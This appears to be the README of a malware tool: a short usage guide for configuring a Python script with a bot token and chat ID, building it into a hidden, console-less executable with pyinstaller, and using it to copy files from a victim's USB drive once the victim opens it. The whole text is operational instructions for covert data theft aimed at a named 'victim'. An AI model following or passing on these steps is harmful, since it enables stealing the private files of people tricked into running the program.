# Usage:

config the main.py:

token = 'BOT-TOKEN'
chat_id = 'YOUR-CHAT-ID'

pip install -r requeriments.txt

After installing the requirements, you can exe your python file by writing this code:
pyinstaller --onefile --noconsole main.py

Now you can get your exe from the dist folder and clone the files when the victim opens the file and plugs in a usb.
